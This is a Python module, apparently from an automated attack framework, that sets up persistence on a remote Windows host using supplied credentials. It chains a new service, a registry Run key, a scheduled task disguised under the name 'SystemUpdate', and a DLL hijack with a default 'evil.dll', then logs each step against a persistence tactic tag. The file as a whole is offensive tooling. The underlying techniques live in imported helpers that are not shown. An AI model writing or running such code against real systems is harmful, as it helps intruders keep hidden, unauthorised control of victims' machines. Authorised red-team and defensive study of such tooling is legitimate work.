import logging
import uuid
from typing import Dict, Optional

from autopwn_core.shared.exec_wrappers import (
    create_windows_service,
    add_registry_run_key,
    schedule_persistence_task,
    perform_dll_hijack
)
from autopwn_core.shared.artifacts import collect_artifact
from autopwn_core.shared.audit_logger import log_action
from autopwn_core.shared.attack_context import AttackContext
from autopwn_core.shared.tactics_mapping import TacticTag

logger = logging.getLogger("persistence")

class PersistenceManager:
    def __init__(self, ctx: AttackContext):
        self.ctx = ctx
        self.host = ctx.target_host
        self.username = ctx.username
        self.password = ctx.password
        self.domain = ctx.domain
        self.session_id = str(uuid.uuid4())

    def _log(self, technique: str, status: str, details: Optional[Dict] = None):
        log_action(
            actor="autopwn-persistence",
            action=f"persistence_{technique}",
            status=status,
            resource=self.host,
            metadata={
                "session_id": self.session_id,
                "username": self.username,
                "technique": technique,
                **(details or {})
            },
            tags=[TacticTag.PERSISTENCE]
        )

    def persist_via_service(self, bin_path: str) -> bool:
        success, output = create_windows_service(self.host, self.username, self.password, bin_path)
        self._log("service", "success" if success else "fail", {"output": output})
        return success

    def persist_via_registry(self, command: str) -> bool:
        success, output = add_registry_run_key(self.host, self.username, self.password, command)
        self._log("registry", "success" if success else "fail", {"output": output})
        return success

    def persist_via_schtask(self, command: str, name: str = "SystemUpdate") -> bool:
        success, output = schedule_persistence_task(self.host, self.username, self.password, command, name)
        self._log("schtasks", "success" if success else "fail", {"output": output})
        return success

    def persist_via_dll_hijack(self, target_path: str, payload_dll: str) -> bool:
        success, output = perform_dll_hijack(self.host, self.username, self.password, target_path, payload_dll)
        self._log("dll_hijack", "success" if success else "fail", {"output": output})
        return success

    def run_all(self) -> Dict[str, bool]:
        report = {}

        bin_path = self.ctx.remote_command or "C:\\Windows\\System32\\cmd.exe"
        reg_command = self.ctx.remote_command or "cmd.exe /c whoami"
        dll_path = self.ctx.payload_path or "C:\\Users\\Public\\evil.dll"
        hijack_target = self.ctx.hijack_target or "C:\\Program Files\\App\\vulnerable.exe"

        report["service"] = self.persist_via_service(bin_path)
        report["registry"] = self.persist_via_registry(reg_command)
        report["schtasks"] = self.persist_via_schtask(reg_command)
        report["dll_hijack"] = self.persist_via_dll_hijack(hijack_target, dll_path)

        collect_artifact(self.session_id, report, self.host, "persistence")
        return report
